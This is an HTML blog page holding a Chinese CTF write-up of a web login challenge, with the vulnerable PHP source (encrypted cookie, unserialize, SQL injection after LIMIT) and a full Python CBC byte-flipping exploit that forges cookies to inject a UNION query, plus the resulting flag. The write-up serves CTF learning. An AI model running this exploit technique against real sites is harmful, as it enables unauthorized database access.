@@ -1,0 +1,830 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="前言这是在实验吧上面的一道web题。主要考察cbc字节反转攻击。 分析题目开始就是输入id去登录  首先想到的就是sql注入了，输入1&amp;#39;后页面显示Hello，重新载入的话页面返回报错信息  确实存在注入，看那后面的逗号，猜测注入点在limit后面。然后试了很多，发现题目把union,#，procedure等都过滤了，暂时没想到任何绕过的方法。然后抓包看看消息头看看有没有提示  提示存在te">
+<meta name="keywords" content="WEB">
+<meta property="og:type" content="article">
+<meta property="og:title" content="实验吧-简单的登录题">
+<meta property="og:url" content="http://yoursite.com/2018/02/09/实验吧-简单的登录题/index.html">
+<meta property="og:site_name" content="R00tnb&#39;s Blog">
+<meta property="og:description" content="前言这是在实验吧上面的一道web题。主要考察cbc字节反转攻击。 分析题目开始就是输入id去登录  首先想到的就是sql注入了，输入1&amp;#39;后页面显示Hello，重新载入的话页面返回报错信息  确实存在注入，看那后面的逗号，猜测注入点在limit后面。然后试了很多，发现题目把union,#，procedure等都过滤了，暂时没想到任何绕过的方法。然后抓包看看消息头看看有没有提示  提示存在te">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://www.ktstartblog.top/usr/uploads/2018/02/802802995.jpg">
+<meta property="og:image" content="http://www.ktstartblog.top/usr/uploads/2018/02/470497557.jpg">
+<meta property="og:image" content="http://www.ktstartblog.top/usr/uploads/2018/02/551609679.jpg">
+<meta property="og:updated_time" content="2018-08-04T07:22:44.278Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="实验吧-简单的登录题">
+<meta name="twitter:description" content="前言这是在实验吧上面的一道web题。主要考察cbc字节反转攻击。 分析题目开始就是输入id去登录  首先想到的就是sql注入了，输入1&amp;#39;后页面显示Hello，重新载入的话页面返回报错信息  确实存在注入，看那后面的逗号，猜测注入点在limit后面。然后试了很多，发现题目把union,#，procedure等都过滤了，暂时没想到任何绕过的方法。然后抓包看看消息头看看有没有提示  提示存在te">
+<meta name="twitter:image" content="http://www.ktstartblog.top/usr/uploads/2018/02/802802995.jpg">
+
+
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/02/09/实验吧-简单的登录题/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>实验吧-简单的登录题 | R00tnb's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">R00tnb's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Startseite</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />Über</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Kategorien</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archiv</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/02/09/实验吧-简单的登录题/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="r00tnb">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="R00tnb's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">实验吧-简单的登录题
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2018-02-09 14:41:00" itemprop="dateCreated datePublished" datetime="2018-02-09T14:41:00+08:00">2018-02-09</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Updated at: 2018-08-04 15:22:44" itemprop="dateModified" datetime="2018-08-04T15:22:44+08:00">2018-08-04</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是在<a href="http://www.shiyanbar.com/ctf/2037" target="_blank" rel="noopener">实验吧</a>上面的一道web题。主要考察cbc字节反转攻击。</p>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>题目开始就是输入id去登录</p>
+<p><img src="http://www.ktstartblog.top/usr/uploads/2018/02/802802995.jpg" alt="1"></p>
+<p>首先想到的就是sql注入了，输入<code>1&#39;</code>后页面显示<code>Hello</code>，重新载入的话页面返回报错信息</p>
+<p><img src="http://www.ktstartblog.top/usr/uploads/2018/02/470497557.jpg" alt="2"></p>
+<p>确实存在注入，看那后面的逗号，猜测注入点在<code>limit</code>后面。然后试了很多，发现题目把<code>union,#，procedure</code>等都过滤了，暂时没想到任何绕过的方法。然后抓包看看消息头看看有没有提示</p>
+<p><img src="http://www.ktstartblog.top/usr/uploads/2018/02/551609679.jpg" alt="3"></p>
+<p>提示存在<code>test.php</code>文件，访问后是php源码，接下来就是源码分析了<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, <span class="string">'***********'</span>);</span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'conn.php'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqliCheck</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">"/\\\|,|-|#|=|~|union|like|procedure/i"</span>,$str))&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_iv</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $random_iv=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">16</span>;$i++)&#123;</span><br><span class="line">        $random_iv.=chr(rand(<span class="number">1</span>,<span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($info)</span></span>&#123;</span><br><span class="line">	$iv = get_random_iv();</span><br><span class="line">	$plain = serialize($info);</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    setcookie(<span class="string">"iv"</span>, base64_encode($iv));</span><br><span class="line">    setcookie(<span class="string">"cipher"</span>, base64_encode($cipher));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_homepage</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $link;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'cipher'</span>]) &amp;&amp; <span class="keyword">isset</span>($_COOKIE[<span class="string">'iv'</span>]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[<span class="string">'cipher'</span>]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[<span class="string">"iv"</span>]);</span><br><span class="line">        <span class="keyword">if</span>($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info = unserialize($plain) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"&lt;p&gt;base64_decode('"</span>.base64_encode($plain).<span class="string">"') can't unserialize&lt;/p&gt;"</span>);</span><br><span class="line">            $sql=<span class="string">"select * from users limit "</span>.$info[<span class="string">'id'</span>].<span class="string">",0"</span>;</span><br><span class="line">            $result=mysqli_query($link,$sql);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(mysqli_num_rows($result)&gt;<span class="number">0</span>  <span class="keyword">or</span> <span class="keyword">die</span>(mysqli_error($link)))&#123;</span><br><span class="line">            	$rows=mysqli_fetch_array($result);</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'&lt;h1&gt;&lt;center&gt;Hello!'</span>.$rows[<span class="string">'username'</span>].<span class="string">'&lt;/center&gt;&lt;/h1&gt;'</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;'</span>;</span><br><span class="line">			&#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"ERROR!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'id'</span>]))&#123;</span><br><span class="line">    $id = (string)$_POST[<span class="string">'id'</span>];</span><br><span class="line">    <span class="keyword">if</span>(sqliCheck($id))</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"&lt;h1 style='color:red'&gt;&lt;center&gt;sql inject detected!&lt;/center&gt;&lt;/h1&gt;"</span>);</span><br><span class="line">    $info = <span class="keyword">array</span>(<span class="string">'id'</span>=&gt;$id);</span><br><span class="line">    login($info);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">"iv"</span>])&amp;&amp;<span class="keyword">isset</span>($_COOKIE[<span class="string">'cipher'</span>]))&#123;</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;body class="login-body" style="margin:0 auto"&gt;</span></span><br><span class="line"><span class="string">                &lt;div id="wrapper" style="margin:0 auto;width:800px;"&gt;</span></span><br><span class="line"><span class="string">                    &lt;form name="login-form" class="login-form" action="" method="post"&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="header"&gt;</span></span><br><span class="line"><span class="string">                        &lt;h1&gt;Login Form&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                        &lt;span&gt;input id to login&lt;/span&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="content"&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name="id" type="text" class="input id" value="id" onfocus="this.value=\'\'" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="footer"&gt;</span></span><br><span class="line"><span class="string">                        &lt;p&gt;&lt;input type="submit" name="submit" value="Login" class="button" /&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;/form&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/body&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>分析整个代码可以发现，通过post的id值由于被<code>sqliCheck</code>函数过滤了关键字无法在此处注入。另一处可注入的点在sql语句拼接的时候，在这里代码把解序列化后的数据直接拼接进sql语句中，如果可以控制此处的数据那么就可以造成注入。<br>那该如何控制这里的数据呢？可以发现，程序使用了<code>aes-128-cbc</code>的加密算法来加密和解密，而这种算法是存在字节反转攻击的，再配合程序在解序列化失败后返回解密后的明文，我们就可以控制密文来得到我们想要的任意明文，从而控制sql语句。对于<code>cbc字节反转攻击</code>的利用方法和原理网上有很多，抽时间自己也总结一下。下面是我的exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,base64,urllib,math</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://ctf5.shiyanbar.com/web/jiandan/index.php'</span></span><br><span class="line">    payload = <span class="string">'0 union select 1,value,3 from you_want limit 1#'</span>  </span><br><span class="line">    <span class="comment">#payload = 'x'*20</span></span><br><span class="line">    </span><br><span class="line">    plaintext = <span class="string">'a:1:&#123;s:2:"id";s:%d:"%s";&#125;'</span>%(len(payload),payload)</span><br><span class="line">    badText = <span class="string">'x'</span>*<span class="number">16</span></span><br><span class="line">    <span class="keyword">if</span> len(plaintext)%<span class="number">16</span>:</span><br><span class="line">        <span class="keyword">if</span> len(plaintext)%<span class="number">16</span>&gt;<span class="number">3</span>:</span><br><span class="line">            badText = <span class="string">'x'</span>*(len(plaintext)%<span class="number">16</span><span class="number">-3</span>)+<span class="string">'";&#125;'</span></span><br><span class="line">        <span class="keyword">elif</span> len(plaintext)%<span class="number">16</span> == <span class="number">3</span>:</span><br><span class="line">            badText = <span class="string">'";&#125;'</span></span><br><span class="line">        <span class="keyword">elif</span> len(plaintext)%<span class="number">16</span> == <span class="number">1</span>:</span><br><span class="line">            badText = <span class="string">'&#125;'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            badText = <span class="string">';&#125;'</span></span><br><span class="line">    r = requests.post(url,data=&#123;<span class="string">'id'</span>:<span class="string">'x'</span>*len(payload)&#125;)</span><br><span class="line">    sc = r.headers[<span class="string">'Set-Cookie'</span>].split(<span class="string">','</span>)</span><br><span class="line">    </span><br><span class="line">    iv = <span class="string">'a'</span>*<span class="number">16</span></span><br><span class="line">    cipher = sc[<span class="number">1</span>][sc[<span class="number">1</span>].find(<span class="string">'='</span>)+<span class="number">1</span>:]</span><br><span class="line">    blockNum = len(cipher)/<span class="number">16</span></span><br><span class="line">    cipher = base64.b64decode(urllib.unquote(cipher))</span><br><span class="line">    blockNum = len(cipher)/<span class="number">16</span></span><br><span class="line">    cipherBlock = [iv]</span><br><span class="line">    cipherBlock += [cipher[<span class="number">16</span>*i:<span class="number">16</span>*(i+<span class="number">1</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(blockNum)]</span><br><span class="line">    plainBlock = [plaintext[<span class="number">16</span>*i:<span class="number">16</span>*(i+<span class="number">1</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(blockNum)]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(blockNum<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">        s1 = plainBlock[i]</span><br><span class="line">        s2 = cipherBlock[i]</span><br><span class="line">        tmp = <span class="string">''</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(len(s1)):</span><br><span class="line">            tmp += chr(ord(s1[j])^ord(badText[j])^ord(s2[j]))</span><br><span class="line"></span><br><span class="line">        cipherBlock[i]=tmp+s2[len(tmp):]</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            iv = cipherBlock[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        iv_new = urllib.quote(base64.b64encode(iv))</span><br><span class="line">        cipher_new = urllib.quote(base64.b64encode(<span class="string">''</span>.join(cipherBlock[<span class="number">1</span>:])))</span><br><span class="line">        headers=&#123;<span class="string">'Cookie'</span>:<span class="string">'iv=&#123;&#125;;cipher=&#123;&#125;'</span>.format(iv_new,cipher_new)&#125;</span><br><span class="line"></span><br><span class="line">        r = requests.get(url,headers=headers)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> i != <span class="number">0</span>: </span><br><span class="line">            tmp = r.text[r.text.find(<span class="string">'decode'</span>)+<span class="number">8</span>:r.text.rfind(<span class="string">"')"</span>)]</span><br><span class="line">            badText = base64.b64decode(tmp)[<span class="number">16</span>*(i<span class="number">-1</span>):<span class="number">16</span>*i]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> r.text.encode(<span class="string">'gb18030'</span>)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">work()</span><br></pre></td></tr></table></figure></p>
+<p>最后通过控制exp中的<code>payload</code>来注入sql语句，读取flag<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\gyh\Desktop&gt;python 1.py</span><br><span class="line">??????&lt;h1&gt;&lt;center&gt;Hello!flag&#123;c42b2b758a5a36228156d9d671c37f19&#125;&lt;/center&gt;&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">C:\Users\gyh\Desktop&gt;</span><br></pre></td></tr></table></figure></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这道题主要考察<code>cbc字节反转攻击</code>，再结合本题在解序列化失败后返回解密的明文的特定的情况，可以控制整个明文字符串。但是当时没注意本题的这种特定情况导致我浪费了很多时间，看来细心很重要啊。</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/WEB/" rel="tag"># WEB</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/02/07/pwnable.kr-codemap/" rel="next" title="pwnable.kr-codemap">
+                <i class="fa fa-chevron-left"></i> pwnable.kr-codemap
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/02/13/pwnable.kr-memcpy/" rel="prev" title="pwnable.kr-memcpy">
+                pwnable.kr-memcpy <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Inhaltsverzeichnis
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Übersicht
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">r00tnb</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">44</span>
+                    <span class="site-state-item-name">Artikel</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">4</span>
+                    <span class="site-state-item-name">Kategorien</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">7</span>
+                    <span class="site-state-item-name">Tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#分析"><span class="nav-number">2.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">r00tnb</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Gemini</a> v6.3.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
